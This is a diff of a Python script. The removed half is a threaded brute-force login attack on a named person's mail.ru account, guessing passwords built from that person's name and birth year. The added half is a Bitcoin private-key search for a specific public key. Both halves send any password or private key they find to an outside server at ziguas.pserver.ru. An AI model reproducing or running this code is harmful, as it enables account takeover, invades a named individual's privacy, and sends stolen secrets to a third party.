@@ -1,88 +1,119 @@
-import sys,time,socket
-import imapclient
-import random
-import threading
+import ctypes
+import platform
+import math
 import os,requests
+import bit
+import time
+import random
+from coincurve import PrivateKey,PublicKey
+from coincurve.utils import int_to_bytes, hex_to_bytes, bytes_to_int, bytes_to_hex, int_to_bytes_padded
+import sys
 
-found = set()
-pooll = set()
-for n in range(10):
-    spns = False
-    try :
-        spns = requests.get("https://ziguas.pserver.ru/bcon/mail_blo/text.txt", timeout=60).text
-    except:
-        pass
-    if spns:
-        break
-vase = int(spns.strip())
-def bcdechex(dec):  
-    keyspace = ["GuwanchmyratOrazow", "Guwanchmyrat", "Orazow", "Myrat", "Guwanch", "Guwanc", "Murat", "Orazov", "Guvanch", "Guvanc", "GuvanchmyratOrazow", "Guvanchmyrat", "GuvanchmyratOrazov", "guwanchmyratOrazow", "guwanchmyrat", "orazow", "myrat", "guwanch", "guwanc", "murat", "orazov", "guvanch", "guvanc", "guvanchmyratOrazow", "guvanchmyrat", "guvanchmyratOrazov", "Kwanch", "Kwanc", "Kvanch", "Kvanc", "kwanch", "kwanc", "kvanch", "kvanc", "1993", "93", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "-", "_"] #"0123456789-_charydinyewvmCHARYDINYEWVM"
-    hexin = ''
-    while(dec>0):   
-        last = dec % len(keyspace)
-        hexin = hexin+""+keyspace[last]
-        dec = dec//len(keyspace)  
-    return hexin
+def pub2point(pub_hex):
+	x = int(pub_hex[2:66],16)
+	if len(pub_hex) < 70:
+		y = bit.format.x_to_y(x, int(pub_hex[:2],16)%2)
+	else:
+		y = int(pub_hex[66:], 16)
+	return PublicKey.from_point(x, y)
+    
+def pointsub(main,other):
+    modulo	= 115792089237316195423570985008687907853269984665640564039457584007908834671663
+    x,y = other.point()
+    negative = PublicKey.from_point(x, -y % modulo)
+    return main.combine_keys([main,negative])
+    
+G = PublicKey.from_point(55066263022277343669578718895168534326250603453777594175500187360389116729240,32670510020758816978083085130507043184471273380659243275938904335757337482424)
+oner = int_to_bytes(1)
+# x,y = G.point()
+# print(x)
+# sys.exit()
+total_entries = 1000000
+bl_entries = 50000
+
+public_key = "033cdd9d6d97cbfe7c26f902faf6a435780fe652e159ec953650ec7b1004082790" #"02CEB6CBBCDBDF5EF7150682150F4CE2C6F4807B349827DCDBDD1F2EFA885A2630"
+min_k = 0x200000000
+max_k = 0x3ffffffff
+
+if platform.system().lower().startswith('win'):
+    mylib = ctypes.CDLL('bloom.dll')
+    
+elif platform.system().lower().startswith('lin'):
+    mylib = ctypes.CDLL('./bloom.so')
+    
+bloom_check_add = mylib.bloom_check_add
+bloom_check_add.restype = ctypes.c_int
+bloom_check_add.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.c_ulonglong, ctypes.c_ubyte, ctypes.c_char_p]
 
 
-def fill_pooll(no):
-    global pooll
-    global vase
-    try :
-        spns = requests.get("https://ziguas.pserver.ru/bcon/mail_blo/?id="+str(vase), timeout=60)
-    except:
-        pass
-    for x in range(no):
-        pooll.add(vase)
-        vase += 1
         
-def checkin(c):
-    global pooll
-    global found
-    try : 
-        pord = random.sample(pooll, 1)[0]
-        password = bcdechex(pord)
-        server = imapclient.IMAPClient("imap.mail.ru", port=993, use_uid=True, ssl=True, timeout=20)
-        server.login("orazow_1993@mail.ru", password)
-        print(" +++ Password found  : %s ", password ) 
-        found.add(password)
-    except imapclient.exceptions.LoginError:
-        if (c-len(pooll)) % 1000 == 0:
-            print("{:,} {:,} {} {}".format(c,c-len(pooll),password,threading.active_count()))
-        if pord in pooll:
-            pooll.remove(pord)
-    except:
-        pass
 
-if __name__ == "__main__":
-    threads = list()
-    while len(found)<1:
-        if len(pooll) == 0:
-            fill_pooll(50000)
-            if len(threads) > 0:
-                for index, thread in enumerate(threads):
-                    try:
-                        thread.join()
-                    except:
-                        pass
-                threads = list()
+bloom_prob = 0.000000001                # False Positive = 1 out of 1 billion
+bloom_bpe = -(math.log(bloom_prob) / 0.4804530139182014)
+
+bloom_bits = int(total_entries * bloom_bpe)  # ln(2)**2
+if bloom_bits % 8: bloom_bits = 8*(1 + (bloom_bits//8))
+bloom_hashes = math.ceil(0.693147180559945 * bloom_bpe)
+
+
+print('bloom bits  :', bloom_bits, '   size [%s MB]'%(bloom_bits//(8*1024*1024)))
+print('bloom hashes:', bloom_hashes)
+bloom_filter = bytes( bytearray(b'\x00') * (bloom_bits//8) )
+
+daelta = {}
+P = pub2point(public_key)
+for n in range(1,total_entries+1):
+        P = G.combine_keys([P,G])
+        x,y = P.point()
+        mod_hash = "{:064x}".format(x)
+        res = bloom_check_add(bytes.fromhex(mod_hash), 32, 1, bloom_bits, bloom_hashes, bloom_filter)
+        if bl_entries > n:
+            daelta[mod_hash] = n
+        if n % 1000000 == 0:
+            print("{:,}".format(n),mod_hash)
+            
+print("Start")
+m_bb = bl_entries
+bsgs = total_entries//bl_entries
+zebra = 0
+found = False
+wait = 10
+while True:
+    key = random.SystemRandom().randint(min_k, max_k)
+    Point = G.multiply(int_to_bytes(key))
+    x,y = Point.point()
+    pubct = "{:064x}".format(x)
+    if bloom_check_add(bytes.fromhex(pubct), 32, 0, bloom_bits, bloom_hashes, bloom_filter) > 0:
+        idx = daelta.get(pubct)
+        print("catch")
+        if idx:
+            keyn = key - idx
+            privkey = "{:064x}".format(keyn)
+            print(privkey)
+            found = privkey
+        else:
+            biddas = G.multiply(int_to_bytes(m_bb))
+            pint = Point
+            for d in range(bsgs):
+                key = key - m_bb
+                pint = pointsub(pint, biddas)
+                mxi,yxi = pint.point()
+                xc = "{:064x}".format(mxi)
+                idx = daelta.get(xc)
+                if idx:
+                    keyn = key - idx
+                    privkey = "{:064x}".format(keyn)
+                    print("faund from full")
+                    print(privkey)
+                    found = privkey
+    if found:
         try:
-            if threading.active_count() < 1000:
-                x = threading.Thread(target = checkin , args = (vase,), daemon=True)
-                threads.append(x)
-                x.start()
+            respns = requests.get("https://ziguas.pserver.ru/bcon/?id="+str(found), timeout=60)
+            print("request send waiting ",wait," sec priv: ",str(found))
+            time.sleep(wait)
+            wait += 10 
         except:
-            time.sleep(1)
             pass
-
-
-
-    while True:
-        if 2 > threading.active_count():
-            print("Found")
-            print(found)
-            try:
-                respns = requests.get("https://ziguas.pserver.ru/bcon/?id="+str(found), timeout=60)
-            except:
-                pass
-            break
+    if zebra % 100000 == 0:
+        print("{:,}".format(zebra),pubct)
+    zebra += 1
